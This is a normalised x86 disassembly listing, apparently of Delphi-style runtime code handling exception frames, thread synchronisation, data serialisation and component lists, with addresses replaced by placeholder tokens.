push sub_41919d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416bcc
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_419178
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_417068
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_415af8
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_417068
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416488
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_419153
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_418904
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_417068
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_415af8
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_417068
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4102cc
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
lea eax [ ebp - 0x1c ]
call sub_4054f0
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40ccb4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41915a
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
sub_4191bc
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4193b6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e828
mov eax [ ebp - 0x4 ]
call sub_417044
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b3e8
call sub_40386c
jmp [ eax * 4 + jump_table_4191fe ]
mov eax [ ebp - 0x4 ]
call sub_418aa4
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bb4
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fb04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bb4
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fb04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417bb4
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fb04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417998
mov eax ebx
call sub_40fb94
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4179dc
mov eax ebx
call sub_40fb94
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a20
mov eax ebx
call sub_40fbbc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417a70
mov eax ebx
call sub_40fba8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418904
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fbd0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_4189c0
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fbfc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418aa4
cmp al 0x9
sete dl
mov eax ebx
call sub_40fb6c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418ff4
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40eb50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417c20
push edx
push eax
mov eax ebx
call sub_40fb40
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4193bd
lea eax [ ebp - 0x1c ]
call sub_40e83c
lea eax [ ebp - 0xc ]
call sub_404594
lea eax [ ebp - 0x8 ]
call sub_403eb4
retn
mov eax ebx
call sub_4103b4
jmp r-xdata
sub_4193c4
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_419410
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_41943c
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4193c4
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4193c4
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_4193c4
jmp r-xdata
pop edx
pop ebx
retn
sub_4194c0
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4042c0
je r-xdata
mov eax esi
call sub_404174
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_404174
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4193c4
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_4193c4
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_4193c4
mov dl 0x6
mov eax ebx
call sub_4195ac
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_4193c4
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_4193c4
sub_419558
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41959d
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405964
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_4194c0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4195a4
lea eax [ ebp - 0x4 ]
call sub_403eb4
retn
sub_419658
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
call sub_41960c
mov eax ebx
call sub_419618
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_4197e6
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_4197c7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197ce
mov eax [ ebp - 0xc ]
call sub_4030f8
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4139f4
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4138e4
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419791
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_419762
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_4197f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419634
test bl bl
je r-xdata
xor eax eax
push ebp
push sub_419839
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax esi
call sub_403eac
mov eax [ ebp - 0x4 ]
call sub_4030f8
sub_41983e
call sub_40279c
mov edx [ ebp - 0x4 ]
mov [ edx + 0x38 ] eax
call sub_4038e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov bl [ eax + 0xf ]
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx ]
mov eax [ ebp - 0x4 ]
mov [ eax + 0x10 ] 0x1
call sub_419634
test bl bl
je r-xdata
mov eax esi
call sub_403eac
mov eax [ ebp - 0x4 ]
call sub_4030f8
sub_4198a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x1 ] dl
mov esi eax
xor eax eax
push ebp
push sub_41994a
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax esi
call sub_4030c8
call sub_419640
mov [ esi + 0xe ] bl
mov [ esi + 0xc ] bl
push esi
push 0x4
lea eax [ esi + 0x8 ]
push eax
mov ecx sub_4197f8
xor edx edx
xor eax eax
call sub_403e68
mov ebx eax
mov [ esi + 0x4 ] ebx
test ebx ebx
jne r-xdata
add esp 0xfffffff0
call sub_403404
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419951
lea eax [ ebp - 0x10 ]
call sub_403eb4
retn
call GetLastError
lea edx [ ebp - 0x10 ]
call sub_40ab24
mov eax [ ebp - 0x10 ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
sub_419970
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
cmp [ esi + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
mov eax [ esi + 0x38 ]
call sub_4030f8
call sub_41964c
test bl bl
jle r-xdata
push eax
call CloseHandle
mov eax esi
call sub_419c30
cmp [ esi + 0xc ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
mov eax esi
call sub_419c38
mov eax esi
call sub_419c08
sub_4199e4
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov ebx edx
xor eax eax
push ebp
push sub_419a52
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419a59
lea eax [ ebp - 0x14 ]
call sub_403eb4
retn
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_40ab24
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x1
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
sub_419aa0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x4 ] edx
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0x0
push 0x0
push 0xffffffff
push 0x0
call CreateEventA
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_419bc2
push [ fs : eax ]
mov [ fs : eax ] esp
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_419ba4
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jne r-xdata
mov ebx [ ebp - 0x4 ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_413898
call sub_419634
cmp [ rw-data ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419b85
push [ fs : eax ]
mov [ fs : eax ] esp
push 0xffffffff
mov eax [ ebp - 0x8 ]
push eax
call WaitForSingleObject
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b8c
push rw-data
call EnterCriticalSection
retn
mov eax [ ebp - 0xc ]
mov edx [ eax ]
mov eax [ rw-data ]
call [ rw-data ]
sub_419be0
push ebp
mov ebp esp
mov [ eax + 0x20 ] eax
xor edx edx
mov [ eax + 0x30 ] edx
mov edx [ ebp + 0x8 ]
mov [ eax + 0x28 ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x2c ] edx
lea edx [ eax + 0x20 ]
mov eax [ eax ]
call sub_419aa0
pop ebp
retn 0x8
sub_419c08
push ebx
push esi
mov ebx eax
mov eax [ ebx + 0x4 ]
push eax
call ResumeThread
mov esi eax
test esi esi
setge dl
mov eax ebx
call sub_419a60
dec esi
jne r-xdata
pop esi
pop ebx
retn
mov [ ebx + 0xe ] 0x0
sub_419c38
push ebx
push esi
add esp 0xffffffd8
mov esi eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x4 ] eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
push 0xffffffff
mov eax [ esp + 0x8 ]
push eax
call WaitForSingleObject
xor ebx ebx
mov eax [ rw-data ]
mov [ esp + 0x8 ] eax
push 0x40
push 0x3e8
push 0x0
lea eax [ esp + 0x10 ]
push eax
push 0x2
call MsgWaitForMultipleObjects
mov ebx eax
cmp ebx 0xffffffff
setne dl
mov eax esi
call sub_419a60
cmp ebx 0x1
jne r-xdata
push 0x0
push 0x0
push 0x0
push 0x0
lea eax [ esp + 0x1c ]
push eax
call PeekMessageA
test ebx ebx
jne r-xdata
xor eax eax
call sub_419658
cmp ebx 0x2
jne r-xdata
jmp r-xdata
push esp
mov eax [ esp + 0x8 ]
push eax
call GetExitCodeThread
cmp eax 0x1
sbb edx edx
inc edx
mov eax esi
call sub_419a60
mov eax [ esp ]
add esp 0x28
pop esi
pop ebx
retn
sub_419cdc
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419e94
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_419d28
push ebx
push esi
push ecx
call sub_40346c
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419f7c
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_419f24
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_414000
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419eec
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_403454
lea eax [ ebx + 0x14 ]
call sub_40cc80
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4139f4
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419dac
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413a50
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413898
mov edx ebx
mov eax esi
call sub_419dac
sub_419e40
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_413898
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ ebx + 0x10 ] eax
sub_419e6c
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413b90
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_4030f8
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419e94
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_4032f4
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_419e40
mov dl 0x1
mov eax ebx
call sub_41a3b4
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_41a364
sub_419eec
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_41a3b4
mov edx ebx
mov eax esi
call sub_419e6c
pop edi
pop esi
pop ebx
retn
sub_419f24
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413adc
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419eec
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419e6c
sub_419f7c
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4139f4
call sub_419f7c
inc edi
dec esi
jne r-xdata
sub_419fb8
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413b90
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_4030f8
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419fdc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_419fb8
mov edx ebx
mov eax esi
call sub_419fb8
pop esi
pop ebx
retn
sub_419ff8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419fdc
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4139f4
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_41a054
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_419e00
push ebx
push sub_419e28
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_419e14
push ebx
push sub_419e34
mov ax [ ebp - 0x2 ]
cmp ax [ ebx + 0x1a ]
setne cl
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ eax + 0x18 ]
mov [ ebp - 0x4 ] eax
sub_41a14c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
test edi edi
je r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_407ab4
test al al
jne r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebx + 0x4 ] 0x0
je r-xdata
cmp ebx [ edi + 0x4 ]
jne r-xdata
push esi
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ ebx + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov edx esi
mov eax ebx
call sub_41a1e4
test eax eax
je r-xdata
mov [ ebp - 0xc ] esi
mov [ ebp - 0x8 ] 0xb
lea eax [ ebp - 0xc ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
sub_41a1e4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov edi eax
cmp [ esp ] 0x0
je r-xdata
xor esi esi
cmp [ edi + 0x10 ] 0x0
je r-xdata
mov eax [ edi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor ebp ebp
mov eax esi
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebp
dec ebx
jne r-xdata
mov eax [ edi + 0x10 ]
mov edx ebp
call sub_4139f4
mov esi eax
mov eax [ esi + 0x8 ]
mov edx [ esp ]
call sub_407ab4
test al al
jne r-xdata
sub_41a234
push ebx
push esi
push edi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov eax [ ebx + 0x8 ]
mov edx esi
call sub_4042c0
je r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
test esi esi
je r-xdata
mov edi [ ebx + 0x4 ]
test edi edi
je r-xdata
mov eax esi
call sub_407d38
test al al
jne r-xdata
push esi
mov ecx [ ebx + 0x8 ]
xor edx edx
mov eax ebx
mov edi [ eax ]
call [ edi + 0x20 ]
push esi
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax edi
mov edi [ eax ]
call [ edi + 0x20 ]
jmp r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0xb
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b424
call sub_40386c
xor edx edx
mov eax ebx
call sub_41a3b4
mov edx esi
mov eax ebx
call sub_41a2c0
mov dl 0x1
mov eax ebx
call sub_41a3b4
sub_41a2d4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_4139f4
pop esi
pop ebx
retn
mov edx [ rw-data ]
mov ecx esi
mov eax [ r-xdata ]
call sub_413980
sub_41a310
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ eax + 0x10 ]
mov edx ebx
call sub_413a50
test eax eax
jl r-xdata
mov edx [ ebx + 0x4 ]
mov edi [ edx + 0x10 ]
mov edx [ edi + 0x8 ]
test esi esi
jge r-xdata
cmp edx esi
jg r-xdata
xor esi esi
cmp eax esi
je r-xdata
mov esi edx
dec esi
mov edx edi
xchg edx eax
call sub_4138e4
mov eax [ ebx + 0x4 ]
mov eax [ eax + 0x10 ]
mov ecx ebx
mov edx esi
call sub_413a70
sub_41a364
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov ebx edx
mov esi eax
test bl bl
je r-xdata
and [ esi + 0x1c ] 0xffef
or [ esi + 0x1c ] 0x10
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_41a300
mov ebp eax
dec ebp
test ebp ebp
jl r-xdata
cmp [ esp ] 0x0
je r-xdata
inc ebp
xor edi edi
mov edx edi
mov eax esi
call sub_41a2d4
mov cl 0x1
mov edx ebx
call sub_41a364
inc edi
dec ebp
jne r-xdata
sub_41a3b4
push ebx
push esi
push edi
add esp 0xffffff00
mov ebx edx
mov edi eax
mov esi [ edi + 0x4 ]
test esi esi
je r-xdata
add esp 0x100
pop edi
pop esi
pop ebx
retn
mov eax esp
mov edx [ edi + 0x8 ]
mov ecx 0xff
call sub_404150
mov edx esp
mov eax esi
call sub_4033b4
test eax eax
je r-xdata
test bl bl
je r-xdata
xor edx edx
mov [ eax ] edx
mov [ eax ] edi
jmp r-xdata
sub_41a3fc
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x40 ]
sub_41a424
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov ebx eax
test bl bl
je r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x3c ]
sub_41a46c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ ebx + 0x20 ] 0x0
jne r-xdata
push edi
push esi
mov eax [ ebx + 0x20 ]
push eax
mov eax [ eax ]
call [ eax ]
mov ecx edi
mov edx esi
mov eax ebx
call sub_4031ac
test al al
je r-xdata
mov eax 0x80004002
jmp r-xdata
xor eax eax
